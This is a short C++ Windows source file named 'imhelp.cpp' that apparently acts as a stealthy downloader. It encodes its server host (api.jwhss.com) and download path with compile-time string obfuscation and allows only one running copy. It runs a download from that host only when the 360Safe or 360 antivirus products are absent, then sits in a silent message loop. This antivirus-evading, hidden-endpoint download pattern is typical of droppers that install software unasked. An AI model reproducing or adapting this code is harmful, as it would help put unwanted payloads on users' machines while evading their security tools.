// imhelp.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "imhelp.h"

#include <atlconv.h>

#include <util/globalevent.h>
#include <util/str_encode_embed.h>
#include <util/cconv.h>
#include <network/HttpImplement.h>
#include <msapi/msapp.h>
#include <json/json.h>

#include <msapi/EnumAntivirus.h>
#include <msapi/msapp.h>
#include <thread/threadex.h>
#include <AppDownload.h>
#define EventName  _T("{6EFA37C6-3922-4611-876D-AE1392B94259}")

using namespace msdk;

//
#define _Def_Host		str_encode_embed<20,'a','p','i','.','j','w','h','s','s','.','c','o','m'>().c_str()

//imageview/up
#define _Def_UrlPath	str_encode_embed<20,'i','m','a','g','e','v','i','e','w','/','u','p'>().c_str()
//#define _Def_UrlPath	str_encode_embed<20,'d','f','/','u','p'>().c_str()
//imageview
#define _Def_ProdName   str_encode_embed<20,'i','m','a','g','e','v','i','e','w'>().c_str()


int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);


	if ( CGlobalEvent().OpenEvent(EVENT_ALL_ACCESS, TRUE, EventName) )
		return 0;


	CGlobalEvent glEvent(NULL, TRUE, TRUE,EventName);
	if ( !(msapi::CEnumAntivirus().Has( msapi::Antivirus_360Safe ) || msapi::CEnumAntivirus().Has( msapi::Antivirus_360Sd )) )
	{
		CAppDownload AppDl(_Def_ProdName ,  _Def_UrlPath, _Def_Host,1000) ;
		AppDl.Do();
		//AppDl.Exit( 1000 * 60 * 5);
		MSG msg = {0};
		while (GetMessage( &msg, NULL, 0, 0)) ;
	}


	return 0;
}
